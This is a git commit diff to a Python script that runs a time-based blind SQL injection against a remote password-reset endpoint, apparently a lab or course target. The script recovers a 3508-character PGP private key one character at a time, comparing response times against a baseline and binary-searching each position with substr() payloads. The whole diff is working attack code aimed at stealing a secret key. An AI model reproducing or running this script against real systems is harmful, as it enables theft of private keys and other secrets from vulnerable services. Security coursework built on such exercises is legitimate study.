6f20d863a54868abca5a03df28e159f5460a4522
gamba9911 <237609664+gamba9911@users.noreply.github.com>
2026-02-05 22:00:08 +0100

    measuring normal response for every attack request

--- app.py
+++ app.py
@@ -6,20 +6,22 @@ from flask import Flask
 
 from datetime import datetime
 
-
 app = Flask(__name__)
 
-API_URL = 'http://lbs-2026-00.askarov.net:3030/reset/'
+API_URL = 'http://lbs-2026-02.askarov.net:3030/reset/'
 # API_URL = 'http://127.0.0.1:3000/reset'
-API_RUNS = 10
-THRESHOLD_SECONDS = 0.3
-COUNTER_DELAY = 100000000
+API_RUNS = 1
+THRESHOLD_SECONDS = 1
+COUNTER_DELAY = 10000000
 PREFIX = "-----BEGIN PGP PRIVATE KEY BLOCK-----"
 SUFFIX = "-----END PGP PRIVATE KEY BLOCK-----"
 
 
-def check_payload_true(normal_reponse_time, sql_payload, threshold):
-    sql_payload_time = measure_response_time(API_URL, sql_payload)
+def check_payload_true(sql_payload, threshold):
+    normal_input = {"username": "admin"}
+    normal_reponse_time = measure_avg_response_time(API_URL, normal_input)
+
+    sql_payload_time = measure_avg_response_time(API_URL, sql_payload)
     if sql_payload_time > normal_reponse_time + threshold:
         # print(f"True for {sql_payload}")
         return True
@@ -49,57 +51,55 @@ def measure_avg_response_time(url, input):
     return median(request_times)
 
 
-def discover_char(normal_reponse_time, key_index):
+def discover_char(key_index):
     low, high = 32, 126  # ASCII printable range
     while low <= high:
         mid = (low + high) // 2
         sql_payload = build_sql_payload(f"substr(key,{key_index + 1},1)>'{chr(mid)}'")
-        char_is_higher = check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)
+        char_is_higher = check_payload_true(sql_payload, THRESHOLD_SECONDS)
         if char_is_higher:
             low = mid + 1
         else:
             high = mid - 1
 
     sql_payload = build_sql_payload(f"substr(key,{key_index + 1},1)=='{chr(high)}'")
-    if (check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)):
+    if (check_payload_true(sql_payload, THRESHOLD_SECONDS)):
         return chr(high)
     return chr(low)
 
 
 def chunk_verification(normal_reponse_time):
     sql_payload = build_sql_payload(f"substr(key,1,{len(PREFIX)})=='{PREFIX}'")
-    if (check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)):
+    if (check_payload_true(sql_payload, THRESHOLD_SECONDS)):
         print("\n🚀 Prefix check passed")
 
     sql_payload = build_sql_payload("substr(key,1,1)=='-'")
-    if (check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)):
+    if (check_payload_true(sql_payload, THRESHOLD_SECONDS)):
         print("\n🚀 First character check passed")
 
     key_length = 3508
-    if (check_payload_true(normal_reponse_time, build_sql_payload("LENGTH(key)==" + key_length.__str__()), THRESHOLD_SECONDS)):
+    if (check_payload_true(build_sql_payload("LENGTH(key)==" + key_length.__str__()), THRESHOLD_SECONDS)):
         print("\n🚀 Key Length : " + key_length.__str__())
 
     sql_payload = build_sql_payload(f"substr(key,{key_length - 2},1)=='-'")
-    if (check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)):
+    if (check_payload_true(sql_payload, THRESHOLD_SECONDS)):
         print("\n🚀 Last character check passed")
 
     sql_payload = build_sql_payload(f"substr(key,{key_length - len(SUFFIX) + 1},{len(SUFFIX)})=='{SUFFIX}'")
-    if (check_payload_true(normal_reponse_time, sql_payload, THRESHOLD_SECONDS)):
+    if (check_payload_true(sql_payload, THRESHOLD_SECONDS)):
         print("\n🚀 Suffix check passed")
 
 
 def sql_injection_attack():
     print("\n🚀 Starting Measurement of API")
-    normal_input = {"username": "admin"}
-    normal_reponse_time = measure_avg_response_time(API_URL, normal_input)
 
-    chunk_verification(normal_reponse_time)
+    # chunk_verification(normal_reponse_time)
 
     with open(datetime.now().__str__() + ".txt", "a") as f:
         # after loop each position index of the key to find the character
         key = ""
         for key_index in range(3508):
-            character = discover_char(normal_reponse_time, key_index)
+            character = discover_char(key_index)
             f.write(character)
             print(character)
             key = key + character
